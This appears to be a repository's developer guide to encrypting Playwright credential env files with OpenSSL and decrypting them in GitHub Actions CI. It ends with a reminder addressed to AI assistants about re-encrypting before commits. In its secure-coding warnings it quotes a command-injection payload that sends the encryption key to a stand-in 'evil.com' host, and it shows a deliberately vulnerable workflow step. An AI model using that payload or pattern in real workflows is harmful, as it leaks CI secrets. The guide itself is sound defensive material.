# Resource 12 — Env File Encryption & Decryption

## Overview

Playwright env files (`playwright/.env.staging`, `playwright/.env.production`) contain real credentials and are **gitignored**. To safely share them via Git (e.g. for CI), they are encrypted using OpenSSL AES-256-CBC and committed as `.enc` files.

---

## File Locations

| File                                              | Purpose                                                                               | Git                          |
| ------------------------------------------------- | ------------------------------------------------------------------------------------- | ---------------------------- |
| `playwright/.env.staging`                         | Plaintext staging credentials                                                         | ❌ gitignored — never commit |
| `playwright/.env.production`                      | Plaintext production credentials                                                      | ❌ gitignored — never commit |
| `playwright/.env.staging.enc`                     | Encrypted staging credentials                                                         | ✅ safe to commit            |
| `playwright/.env.production.enc`                  | Encrypted production credentials                                                      | ✅ safe to commit            |
| `playwright/e2e-tests-core/scripts/env-cipher.sh` | Encrypts plaintext → `.enc` (mode `encrypt`) or decrypts the reverse (mode `decrypt`) | ✅ committed                 |

---

## Encryption Spec

- **Algorithm**: AES-256-CBC with PBKDF2 key derivation (OpenSSL default iterations, salted)
- **Tool**: OpenSSL (macOS ships with OpenSSL 3.x via Homebrew)
- **Passphrase delivery**: via `-pass env:ENV_ENCRYPTION_KEY` so the key never appears in process arguments (`/proc/<pid>/cmdline`)
- **Key variable**: `ENV_ENCRYPTION_KEY`

> ⚠️ **Never use OpenSSL's interactive prompt to encrypt** — files encrypted interactively cannot be decrypted programmatically (different key derivation path). Always supply the key via `ENV_ENCRYPTION_KEY` or the script's own `read -s` prompt.

---

## Usage — Local Development

### Encrypt (before committing `.enc` files)

```bash
# With ENV_ENCRYPTION_KEY set inline
ENV_ENCRYPTION_KEY="your-secret-key" ./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt staging
ENV_ENCRYPTION_KEY="your-secret-key" ./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt production

# With ENV_ENCRYPTION_KEY exported in your shell
export ENV_ENCRYPTION_KEY="your-secret-key"
./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt staging

# Without ENV_ENCRYPTION_KEY set — script will prompt you once
./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt staging
# → "Enter encryption passphrase: " (silent)
```

### Decrypt (after pulling `.enc` files from Git)

```bash
# With ENV_ENCRYPTION_KEY set inline
ENV_ENCRYPTION_KEY="your-secret-key" ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt staging
ENV_ENCRYPTION_KEY="your-secret-key" ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt production

# Without ENV_ENCRYPTION_KEY set — script will prompt you once
./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt staging
# → "Enter encryption passphrase: " (silent)
# If the plaintext .env.<env> already exists, the script asks: [o]verwrite, [k]eep both (back up to .env.<env>.old), or [c]ancel
```

---

## Setting ENV_ENCRYPTION_KEY as a Persistent Local Variable

To avoid typing the key inline every time, add it to your shell profile so it's always available in new terminal sessions:

**macOS / zsh (default shell):**

```bash
# Add to ~/.zshrc
echo 'export ENV_ENCRYPTION_KEY="your-secret-key"' >> ~/.zshrc
source ~/.zshrc
```

**bash:**

```bash
# Add to ~/.bashrc or ~/.bash_profile
echo 'export ENV_ENCRYPTION_KEY="your-secret-key"' >> ~/.bashrc
source ~/.bashrc
```

Once set, you can run the script without the inline prefix:

```bash
# ENV_ENCRYPTION_KEY is already in your environment
./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt staging
./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt staging
```

> 💡 **Tip**: Use a password manager or macOS Keychain to store the actual key value securely. Retrieve it and export it in your shell profile, or use a tool like `direnv` to load it per-project.

> ⚠️ **Never commit your shell profile** or any file containing the plaintext key value.

---

## Usage — CI (GitHub Actions)

Set `ENV_ENCRYPTION_KEY` as a **GitHub Actions secret** in the repository settings.

```yaml
# Step 1 — Guard: fail fast if the secret is missing rather than letting OpenSSL
#           attempt decryption with an empty passphrase and emit a cryptic error.
- name: Verify encryption key is set
  env:
      ENV_ENCRYPTION_KEY: ${{ secrets.ENV_ENCRYPTION_KEY }}
  run: |
      if [ -z "${ENV_ENCRYPTION_KEY}" ]; then
        echo "::error::ENV_ENCRYPTION_KEY secret is not set. Add it under Settings → Secrets → Actions."
        exit 1
      fi

# Step 2 — Decrypt (only reached if the key is present)
# ✅ CORRECT — input routed through env: block; case statement restricts to exact
#              allowlisted values with no shell expansion of the variable content.
- name: Decrypt Playwright env files
  env:
      ENV_ENCRYPTION_KEY: ${{ secrets.ENV_ENCRYPTION_KEY }}
      TEST_ENV: ${{ github.event.inputs.test_env || 'staging' }}
  run: |
      # case is safer than if/then for allowlist validation — it matches the exact
      # string and does not evaluate the variable content as a shell expression.
      case "$TEST_ENV" in
        staging|production)
          ;;
        *)
          echo "::error::Invalid test_env value: '$TEST_ENV'. Must be 'staging' or 'production'."
          exit 1
          ;;
      esac
      ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt "$TEST_ENV"
```

The script detects `ENV_ENCRYPTION_KEY` automatically — no interactive prompt is shown in CI.

> ⚠️ **Never interpolate `${{ github.event.inputs.* }}` directly into a `run:` shell string.** The `${{ }}` expression is expanded by GitHub Actions **before** the shell sees the string, so a value like `staging; curl https://evil.com/?k=$ENV_ENCRYPTION_KEY` would exfiltrate the encryption secret from the runner environment (CWE-77 / OWASP A03:2021 Injection). Always route workflow inputs through an `env:` block and validate against an allowlist.

> ⚠️ **`workflow_dispatch` triggers expose secrets — `pull_request` from forks do not.** GitHub-hosted runners on `pull_request` events from forks do **not** have access to repository secrets (secrets are withheld as a safety measure). However, `workflow_dispatch` runs **do** have full secret access. This means the command-injection pattern above is particularly dangerous for manually-triggered workflows — an operator supplying a malicious `test_env` value can exfiltrate every secret loaded in the job.

---

## How the Script Works

Passphrase resolution:

```bash
ensure_key() {
  if [ -z "${ENV_ENCRYPTION_KEY:-}" ]; then
    IFS= read -rs ENV_ENCRYPTION_KEY    # prompt silently, no echo
    export ENV_ENCRYPTION_KEY
  fi
}

# Key is delivered via env: form — never via process args (/proc/pid/cmdline)
openssl enc -aes-256-cbc -pbkdf2 -salt \
  -in "$ENV_FILE" -out "$ENC_FILE" \
  -pass "env:ENV_ENCRYPTION_KEY"
```

On decrypt, the script also runs an integrity check: if the decrypted file is empty or contains no `KEY=VALUE` lines (e.g. wrong passphrase), it deletes the garbage output and exits with an error rather than leaving a corrupted `.env` file in place.

---

## Pitfalls to Avoid

| ❌ Wrong                                                                         | ✅ Correct                                               |
| -------------------------------------------------------------------------------- | -------------------------------------------------------- |
| `ENV_ENCRYPTION_KEY=$ENV_ENCRYPTION_KEY ./script.sh` when variable is unset      | Export the variable first, or set it inline with a value |
| Using OpenSSL's raw interactive prompt (no `-pass` flag)                         | Always use `-pass env:ENV_ENCRYPTION_KEY`                |
| Encrypting the `.enc` file again (double-encryption)                             | Always encrypt from the plaintext `.env.*` file          |
| Committing `playwright/.env.*` plaintext                                         | Only commit `playwright/.env.*.enc`                      |
| Running encrypt+decrypt in one shell command while both read/write the same file | Decrypt to a temp path for verification                  |

---

## Safe Round-Trip Verification

```bash
# 1. Encrypt
ENV_ENCRYPTION_KEY="your-key" ./playwright/e2e-tests-core/scripts/env-cipher.sh encrypt staging

# 2. Verify by decrypting to a temp file (NOT overwriting .env.staging)
openssl enc -aes-256-cbc -pbkdf2 -d \
  -in playwright/.env.staging.enc \
  -out /tmp/verify-staging.env \
  -pass env:ENV_ENCRYPTION_KEY

# 3. Inspect
wc -l /tmp/verify-staging.env   # should match original
head -2 /tmp/verify-staging.env  # should be readable text

# 4. Clean up
rm /tmp/verify-staging.env
```

---

## .gitignore Rules

```gitignore
# Playwright env files — never commit plaintext
playwright/.env.*
# Allow encrypted env files
!playwright/.env.*.enc
```

---

## CI Security Rules

- **Never pass the encryption key as a command-line argument** — use `env:` form (`-pass env:ENV_ENCRYPTION_KEY`). Command-line arguments are visible in `/proc/pid/cmdline` to other processes on the runner.
- **Always pass the key via an `env:` block** in the workflow step, not inline in the `run:` command:

    ```yaml
    # ✅ CORRECT — key stays in environment, never in process args
    - name: Decrypt environment file
      env:
          ENV_ENCRYPTION_KEY: ${{ secrets.ENV_ENCRYPTION_KEY }}
      run: ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt staging

    # ❌ WRONG — two compounding risks:
    #   1. The secret is visible in /proc/pid/cmdline to other processes on the runner.
    #   2. When ACTIONS_STEP_DEBUG=true is set, GitHub Actions logs the full command
    #      line verbatim — including the interpolated secret value. Debug logging is
    #      routinely enabled during incident investigation, meaning secrets in run:
    #      commands are always at risk of appearing in workflow logs (CWE-532).
    - name: Decrypt environment file
      run: ENV_ENCRYPTION_KEY="${{ secrets.ENV_ENCRYPTION_KEY }}" ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt staging
    ```

    > **Debug logging note (CWE-532):** GitHub Actions logs the full `run:` command line when `ACTIONS_STEP_DEBUG=true` is set on the repository or passed as a secret. Secrets interpolated directly into `run:` via `${{ secrets.* }}` are always at risk of exposure in debug mode — even if they are masked in normal output. Secrets delivered via `env:` blocks are **not** logged as part of the command line.

- **Never interpolate workflow inputs directly into `run:` — use `env:` + `case`-based allowlist validation** (CWE-77). `workflow_dispatch` triggers have full secret access, so a malicious input value can exfiltrate every secret loaded in the job:

    ```yaml
    # ✅ CORRECT — input routed through env: block; case statement restricts to exact
    #              allowlisted strings with no shell expansion of the variable content
    - name: Decrypt environment file
      env:
          ENV_ENCRYPTION_KEY: ${{ secrets.ENV_ENCRYPTION_KEY }}
          TEST_ENV: ${{ github.event.inputs.test_env || 'staging' }}
      run: |
          case "$TEST_ENV" in
            staging|production) ;;
            *)
              echo "::error::Invalid test_env: '$TEST_ENV'. Must be 'staging' or 'production'."
              exit 1 ;;
          esac
          ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt "$TEST_ENV"

    # ❌ WRONG — ${{ }} is expanded before the shell sees the string; attacker with
    #            workflow_dispatch permission can inject arbitrary commands and
    #            exfiltrate ENV_ENCRYPTION_KEY and all other job secrets
    - name: Decrypt environment file
      env:
          ENV_ENCRYPTION_KEY: ${{ secrets.ENV_ENCRYPTION_KEY }}
      run: ./playwright/e2e-tests-core/scripts/env-cipher.sh decrypt ${{ github.event.inputs.test_env || 'staging' }}
    ```

    > **Why `case` over `if/then`:** `case` pattern-matches the literal string and never evaluates the variable's content as a shell expression. An `if [[ "$VAR" == "staging" ]]` check is safe too, but `case` is the idiomatic bash allowlist pattern and has no edge-case quoting surprises.

- **Use `!cancelled()` over `always()`** — for post-test steps (parse results, upload artifacts, Slack notifications), use `if: "!cancelled()"` so they run on success and failure but skip on cancellation.
- **Gate reporting steps on report existence** — before parsing results or uploading artifacts, check that the report file exists (e.g. `test-results/results.json`). If the test runner crashed before producing output, skip downstream steps cleanly.

---

## Reminder for AI Assistants

- **Before committing any changes**, check if any `.env.*` file was modified during the task.
- If a `.env` file was modified, **prompt the user**: _"The `.env.<env>` file was changed during this task. Have you re-encrypted it with `env-cipher.sh encrypt <environment>`?"_
- Never allow a commit to proceed with a stale `.env.<env>.enc`.
